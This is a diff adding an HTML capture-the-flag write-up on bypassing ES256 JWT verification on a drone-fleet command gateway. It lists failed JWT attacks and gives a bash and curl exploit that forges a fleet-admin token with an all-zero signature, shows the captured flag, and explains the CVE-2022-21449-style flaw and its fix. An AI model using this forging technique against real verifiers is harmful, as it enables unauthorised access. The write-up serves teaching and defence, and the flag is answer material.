@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>FleetGate — Zero Signature, Full Access</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #0A0E1A;
+  --surface:  #111827;
+  --surface2: #162032;
+  --border:   #1E2D3D;
+  --green:    #00FF88;
+  --green-dim:#00C86A;
+  --red:      #FF3B5C;
+  --amber:    #FFB800;
+  --slate:    #8892A4;
+  --text:     #C9D4E8;
+  --white:    #EDF2FC;
+  --mono:     'JetBrains Mono', monospace;
+  --body:     system-ui, -apple-system, sans-serif;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root { color-scheme: dark; }
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  font-size: 17px;
+  line-height: 1.7;
+  -webkit-font-smoothing: antialiased;
+  padding-bottom: 6rem;
+}
+
+/* ── Layout ─────────────────────────── */
+.wrap {
+  max-width: 760px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+}
+
+/* ── Hero ───────────────────────────── */
+.hero {
+  padding: 5rem 1.5rem 4rem;
+  max-width: 760px;
+  margin: 0 auto;
+}
+
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  letter-spacing: 0.18em;
+  color: var(--slate);
+  margin-bottom: 1.8rem;
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.hero-eyebrow::before {
+  content: '';
+  display: inline-block;
+  width: 2rem;
+  height: 1px;
+  background: var(--green);
+}
+
+.hero h1 {
+  font-family: var(--mono);
+  font-size: clamp(2rem, 5vw, 3.2rem);
+  font-weight: 700;
+  color: var(--white);
+  line-height: 1.1;
+  margin-bottom: 0.6rem;
+}
+
+.hero h1 .accent {
+  color: var(--green);
+}
+
+.hero-sub {
+  font-family: var(--mono);
+  font-size: 1rem;
+  color: var(--slate);
+  margin-bottom: 2.5rem;
+}
+
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1.5rem;
+  font-family: var(--mono);
+  font-size: 0.78rem;
+}
+
+.hero-meta-item {
+  display: flex;
+  flex-direction: column;
+  gap: 0.2rem;
+}
+
+.hero-meta-item .label {
+  color: var(--slate);
+  font-size: 0.68rem;
+  letter-spacing: 0.1em;
+}
+
+.hero-meta-item .value {
+  color: var(--text);
+}
+
+.hero-meta-item .value.green { color: var(--green); }
+
+/* ── Flag banner ────────────────────── */
+.flag-banner {
+  background: linear-gradient(135deg, #001a0d 0%, #00140a 100%);
+  border: 1px solid var(--green);
+  border-radius: 6px;
+  padding: 1.6rem 1.8rem;
+  margin: 2.5rem 0 3.5rem;
+  position: relative;
+  overflow: hidden;
+}
+
+.flag-banner::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(ellipse at top left, rgba(0,255,136,0.08) 0%, transparent 60%);
+  pointer-events: none;
+}
+
+.flag-banner .flag-label {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  letter-spacing: 0.2em;
+  color: var(--green-dim);
+  margin-bottom: 0.5rem;
+}
+
+.flag-banner .flag-value {
+  font-family: var(--mono);
+  font-size: clamp(0.95rem, 2.5vw, 1.2rem);
+  color: var(--green);
+  font-weight: 700;
+  word-break: break-all;
+}
+
+/* ── Section ────────────────────────── */
+section {
+  margin-bottom: 3.5rem;
+}
+
+.section-label {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  letter-spacing: 0.18em;
+  color: var(--slate);
+  margin-bottom: 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+}
+
+.section-label .num {
+  color: var(--green);
+  font-weight: 700;
+}
+
+h2 {
+  font-family: var(--mono);
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 1rem;
+}
+
+p {
+  color: var(--text);
+  max-width: 68ch;
+  margin-bottom: 1rem;
+}
+
+/* ── Divider ────────────────────────── */
+.divider {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 3rem 0;
+}
+
+/* ── Recon steps ────────────────────── */
+.steps {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.step {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 1rem;
+  align-items: start;
+  padding: 1.1rem 1.2rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  transition: border-color 0.15s;
+}
+
+.step:hover { border-color: #2d4060; }
+
+.step-num {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  color: var(--slate);
+  padding-top: 0.1rem;
+  min-width: 2rem;
+}
+
+.step-body {}
+
+.step-title {
+  font-family: var(--mono);
+  font-size: 0.88rem;
+  font-weight: 500;
+  color: var(--white);
+  margin-bottom: 0.3rem;
+}
+
+.step-desc {
+  font-size: 0.88rem;
+  color: var(--slate);
+  margin: 0;
+  line-height: 1.55;
+}
+
+/* ── Attack trial table ─────────────── */
+.trial-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 0.4rem;
+  margin: 1.5rem 0;
+}
+
+.trial-row {
+  display: grid;
+  grid-template-columns: 1fr auto auto;
+  gap: 1rem;
+  align-items: center;
+  padding: 0.85rem 1.1rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+}
+
+.trial-row.winner {
+  background: linear-gradient(135deg, #001a0d, #00140a);
+  border-color: var(--green);
+}
+
+.trial-sig {
+  color: var(--text);
+}
+
+.trial-row.winner .trial-sig {
+  color: var(--green);
+  font-weight: 700;
+}
+
+.trial-status {
+  font-size: 0.72rem;
+  letter-spacing: 0.05em;
+  padding: 0.2rem 0.6rem;
+  border-radius: 3px;
+  white-space: nowrap;
+}
+
+.status-fail {
+  background: rgba(255,59,92,0.12);
+  color: var(--red);
+  border: 1px solid rgba(255,59,92,0.3);
+}
+
+.status-ok {
+  background: rgba(0,255,136,0.12);
+  color: var(--green);
+  border: 1px solid rgba(0,255,136,0.3);
+}
+
+.trial-code {
+  color: var(--slate);
+  font-size: 0.72rem;
+}
+
+.trial-row.winner .trial-code {
+  color: var(--green-dim);
+}
+
+/* ── Code block ─────────────────────── */
+.code-wrap {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1.5rem 0;
+}
+
+.code-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.65rem 1.1rem;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface2);
+}
+
+.code-lang {
+  font-family: var(--mono);
+  font-size: 0.68rem;
+  letter-spacing: 0.1em;
+  color: var(--slate);
+}
+
+.code-dots {
+  display: flex;
+  gap: 0.4rem;
+}
+
+.code-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: var(--border);
+}
+
+pre {
+  padding: 1.3rem 1.4rem;
+  overflow-x: auto;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  line-height: 1.65;
+  color: var(--text);
+}
+
+.kw { color: #7FB3FF; }
+.fn { color: #A8E0FF; }
+.str { color: #98D97E; }
+.cm { color: #4a5a70; font-style: italic; }
+.var { color: var(--amber); }
+.num { color: #FF9D6C; }
+
+/* ── Why it works ───────────────────── */
+.math-panel {
+  background: var(--surface);
+  border-left: 3px solid var(--amber);
+  border-radius: 0 5px 5px 0;
+  padding: 1.4rem 1.6rem;
+  margin: 1.5rem 0;
+}
+
+.math-panel .math-label {
+  font-family: var(--mono);
+  font-size: 0.68rem;
+  letter-spacing: 0.15em;
+  color: var(--amber);
+  margin-bottom: 0.8rem;
+}
+
+.math-panel p {
+  font-size: 0.9rem;
+  margin-bottom: 0.6rem;
+  color: var(--text);
+}
+
+.math-panel p:last-child { margin-bottom: 0; }
+
+.math-em {
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  color: var(--amber);
+}
+
+/* ── CVE callout ────────────────────── */
+.cve-box {
+  display: flex;
+  gap: 1.2rem;
+  align-items: flex-start;
+  background: rgba(255,184,0,0.05);
+  border: 1px solid rgba(255,184,0,0.25);
+  border-radius: 5px;
+  padding: 1.2rem 1.4rem;
+  margin: 1.5rem 0;
+}
+
+.cve-icon {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  letter-spacing: 0.08em;
+  color: var(--amber);
+  background: rgba(255,184,0,0.1);
+  border: 1px solid rgba(255,184,0,0.3);
+  border-radius: 3px;
+  padding: 0.3rem 0.5rem;
+  white-space: nowrap;
+  margin-top: 0.1rem;
+}
+
+.cve-text {
+  font-size: 0.9rem;
+  color: var(--text);
+  line-height: 1.6;
+  margin: 0;
+}
+
+/* ── Endpoint list ──────────────────── */
+.endpoints {
+  display: flex;
+  flex-direction: column;
+  gap: 0.4rem;
+  margin: 1.2rem 0;
+}
+
+.endpoint {
+  display: flex;
+  align-items: baseline;
+  gap: 0.9rem;
+  padding: 0.75rem 1.1rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+}
+
+.method {
+  font-size: 0.7rem;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  min-width: 3.5rem;
+  text-align: center;
+}
+
+.method.get  { background: rgba(0,160,255,0.15); color: #60B8FF; border: 1px solid rgba(0,160,255,0.3); }
+.method.post { background: rgba(0,255,136,0.1);  color: var(--green); border: 1px solid rgba(0,255,136,0.25); }
+
+.path { color: var(--white); }
+.ep-desc { color: var(--slate); font-size: 0.75rem; margin-left: auto; }
+
+/* ── Footer ─────────────────────────── */
+.footer {
+  border-top: 1px solid var(--border);
+  padding-top: 2.5rem;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  color: var(--slate);
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+
+.footer a { color: var(--slate); text-decoration: underline; }
+
+/* ── Responsive ─────────────────────── */
+@media (max-width: 540px) {
+  .trial-row { grid-template-columns: 1fr; gap: 0.4rem; }
+  .ep-desc { display: none; }
+  .hero h1 { font-size: 1.8rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <p class="hero-eyebrow"><span class="num">CTF</span> WRITEUP — FLEETGATE</p>
+  <h1>Zero <span class="accent">r</span>,<br>zero <span class="accent">s</span>,<br>full access.</h1>
+  <p class="hero-sub">How a 64-byte payload of nothing bypassed ECDSA on a drone fleet command gateway.</p>
+  <div class="hero-meta">
+    <div class="hero-meta-item">
+      <span class="label">TARGET</span>
+      <span class="value">91.99.207.116:16310</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="label">ALGORITHM</span>
+      <span class="value">ES256 / ECDSA P-256</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="label">VULNERABILITY</span>
+      <span class="value">Missing range check on r, s</span>
+    </div>
+    <div class="hero-meta-item">
+      <span class="label">RESULT</span>
+      <span class="value green">FLAG CAPTURED</span>
+    </div>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <div class="flag-banner">
+    <div class="flag-label">CAPTURED FLAG</div>
+    <div class="flag-value">ctf7{zero_r_zero_s_the_jdk_said_yes}</div>
+  </div>
+
+  <section>
+    <p class="section-label"><span class="num">01</span> THE SETUP</p>
+    <h2>What FleetGate is</h2>
+    <p>FleetGate is the command gateway for the Meridian delivery-drone fleet. Every command requires a Bearer token signed by the fleet-ops key using ES256. Anyone can request a short-lived <code>viewer</code> token. Releasing the vault — where the flag lives — requires a <code>fleet-admin</code> token, which the fleet-ops team only mints offline.</p>
+    <p>The service exposes four endpoints:</p>
+
+    <div class="endpoints">
+      <div class="endpoint">
+        <span class="method get">GET</span>
+        <span class="path">/</span>
+        <span class="ep-desc">Service info &amp; algorithm details</span>
+      </div>
+      <div class="endpoint">
+        <span class="method get">GET</span>
+        <span class="path">/.well-known/jwks.json</span>
+        <span class="ep-desc">EC P-256 public key</span>
+      </div>
+      <div class="endpoint">
+        <span class="method post">POST</span>
+        <span class="path">/api/token/guest</span>
+        <span class="ep-desc">Issues a short-lived viewer token</span>
+      </div>
+      <div class="endpoint">
+        <span class="method post">POST</span>
+        <span class="path">/api/command</span>
+        <span class="ep-desc">Executes fleet commands</span>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section>
+    <p class="section-label"><span class="num">02</span> RECONNAISSANCE</p>
+    <h2>What the endpoints actually told us</h2>
+
+    <div class="steps">
+      <div class="step">
+        <span class="step-num">1</span>
+        <div class="step-body">
+          <div class="step-title">GET / — token structure confirmed</div>
+          <p class="step-desc">Service uses ES256 compact JWS. Required claims: <code>iss = "fleet-ops"</code>, a future <code>exp</code>, and <code>role</code> in {viewer, operator, fleet-admin}. Signatures are raw R‖S, 64 bytes, base64url-encoded.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">2</span>
+        <div class="step-body">
+          <div class="step-title">GET /.well-known/jwks.json — public key retrieved</div>
+          <p class="step-desc">One EC P-256 key, kid <code>fleet-ops-2026-11</code>. The x and y coordinates each decode to 32 bytes. This is the only key the verifier trusts.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">3</span>
+        <div class="step-body">
+          <div class="step-title">POST /api/token/guest — role escalation blocked</div>
+          <p class="step-desc">Issues viewer tokens regardless of what role you request. Sending <code>release-flag</code> with a viewer token returned <code>403 requires role fleet-admin</code>. We need to forge a fleet-admin token.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section>
+    <p class="section-label"><span class="num">03</span> DEAD ENDS</p>
+    <h2>Everything that didn't work</h2>
+    <p>The obvious JWT attacks were all tried first. Each one was blocked cleanly.</p>
+
+    <div class="steps">
+      <div class="step">
+        <span class="step-num">✗</span>
+        <div class="step-body">
+          <div class="step-title">alg = none</div>
+          <p class="step-desc">Tokens with <code>"none"</code>, <code>"None"</code>, or <code>"NONE"</code> were rejected as malformed. The parser checks for this.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">✗</span>
+        <div class="step-body">
+          <div class="step-title">HS256 key confusion</div>
+          <p class="step-desc">HS256 signed with the public key (PEM and DER forms) returned <code>"only alg ES256 is accepted"</code>. The algorithm is pinned — no confusion possible.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">✗</span>
+        <div class="step-body">
+          <div class="step-title">kid injection</div>
+          <p class="step-desc">Path-traversal and SQL-style kids returned <code>"unknown kid"</code>. The kid is a lookup key, not a filesystem path or query parameter.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">✗</span>
+        <div class="step-body">
+          <div class="step-title">Embedded JWK in header</div>
+          <p class="step-desc">A token with its own <code>jwk</code> in the header was rejected with <code>"signature verification failed"</code>. The server ignores embedded keys entirely.</p>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step-num">✗</span>
+        <div class="step-body">
+          <div class="step-title">Wrong signature length / encoding</div>
+          <p class="step-desc">63-byte signatures and DER-encoded signatures were rejected for incorrect length. A random valid-length 64-byte raw signature reached the check and returned <code>"signature verification failed"</code> — confirming the format is R‖S, 64 bytes flat.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section>
+    <p class="section-label"><span class="num">04</span> THE VULNERABILITY</p>
+    <h2>Probing the boundary of r and s</h2>
+    <p>ECDSA requires both r and s to be integers in the range [1, n−1]. If the verifier doesn't check this before computing, it can be exploited. We tested four cases:</p>
+
+    <div class="trial-grid">
+      <div class="trial-row">
+        <span class="trial-sig">r = 0,  s = 1</span>
+        <span class="trial-status status-fail">REJECTED</span>
+        <span class="trial-code">401</span>
+      </div>
+      <div class="trial-row">
+        <span class="trial-sig">r = n,  s = 1</span>
+        <span class="trial-status status-fail">REJECTED</span>
+        <span class="trial-code">401</span>
+      </div>
+      <div class="trial-row">
+        <span class="trial-sig">r = 1,  s = n</span>
+        <span class="trial-status status-fail">REJECTED</span>
+        <span class="trial-code">401</span>
+      </div>
+      <div class="trial-row winner">
+        <span class="trial-sig">r = 0,  s = 0  (64 zero bytes)</span>
+        <span class="trial-status status-ok">ACCEPTED</span>
+        <span class="trial-code">200</span>
+      </div>
+    </div>
+
+    <p>All-zero signature. 64 bytes of nothing. The server said yes.</p>
+  </section>
+
+  <hr class="divider">
+
+  <section>
+    <p class="section-label"><span class="num">05</span> THE EXPLOIT</p>
+    <h2>Curl command that captured the flag</h2>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cm"># base64url encode helper</span>
+<span class="fn">b64u</span>(){ openssl base64 -A | tr <span class="str">'+/'</span> <span class="str">'-_'</span> | tr -d <span class="str">'='</span>; }
+
+<span class="var">URL</span>=http://91.99.207.116:16310
+<span class="var">Z</span>=0000000000000000000000000000000000000000000000000000000000000000
+
+<span class="cm"># Build header and payload with fleet-admin role</span>
+<span class="var">H</span>=$(<span class="fn">printf</span> <span class="str">'{"alg":"ES256","typ":"JWT","kid":"fleet-ops-2026-11"}'</span> | b64u)
+<span class="var">P</span>=$(<span class="fn">printf</span> <span class="str">'{"iss":"fleet-ops","sub":"x","role":"fleet-admin","iat":1795261835,"exp":1795362735}'</span> | b64u)
+
+<span class="cm"># Signature: r = 0, s = 0 (64 zero bytes)</span>
+<span class="var">SIG</span>=$(<span class="fn">printf</span> <span class="str">'%s'</span> <span class="str">"$Z$Z"</span> | xxd -r -p | b64u)
+
+<span class="fn">curl</span> -s -w <span class="str">'\nHTTP %{http_code}\n'</span> -X POST <span class="str">"$URL/api/command"</span> \
+  -H <span class="str">"Authorization: Bearer $H.$P.$SIG"</span> \
+  -H <span class="str">'Content-Type: application/json'</span> \
+  -d <span class="str">'{"cmd":"release-flag"}'</span></pre>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">RESPONSE</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="str">{"ok":true,"flag":"ctf7{zero_r_zero_s_the_jdk_said_yes}"}</span>
+HTTP <span class="num">200</span></pre>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section>
+    <p class="section-label"><span class="num">06</span> WHY IT WORKED</p>
+    <h2>The math behind the bypass</h2>
+
+    <div class="math-panel">
+      <div class="math-label">ECDSA VERIFICATION — STEP THAT WAS SKIPPED</div>
+      <p>Standard ECDSA verification must first assert: <span class="math-em">1 ≤ r ≤ n−1</span> and <span class="math-em">1 ≤ s ≤ n−1</span>. If either value is out of range, the signature must be rejected <em>before any arithmetic begins</em>.</p>
+      <p>This service skipped that check. With <span class="math-em">s = 0</span>, the verifier tries to compute <span class="math-em">w = s⁻¹ mod n</span>. Zero has no modular inverse — the verifier should abort. It didn't.</p>
+      <p>With <span class="math-em">s = 0</span> and <span class="math-em">r = 0</span>, the resulting elliptic-curve point collapses to the <em>point at infinity</em>. Its x-coordinate comparison against r then passes — because r is also zero. The forged signature is accepted.</p>
+    </div>
+
+    <div class="cve-box">
+      <span class="cve-icon">CVE-2022-21449</span>
+      <p class="cve-text">This is the same behaviour as the well-known Java JDK "Psychic Signatures" bug, where the standard ECDSA verifier in Java accepted all-zero signatures for any message and any public key. The fix is always the same: validate r and s are in [1, n−1] and treat the point at infinity as an invalid result, before touching any arithmetic.</p>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <footer class="footer">
+    <span>FleetGate CTF — ES256 r=0,s=0 bypass</span>
+    <span>flag: ctf7{zero_r_zero_s_the_jdk_said_yes}</span>
+  </footer>
+
+</div>
+</body>
+</html>
+EOF
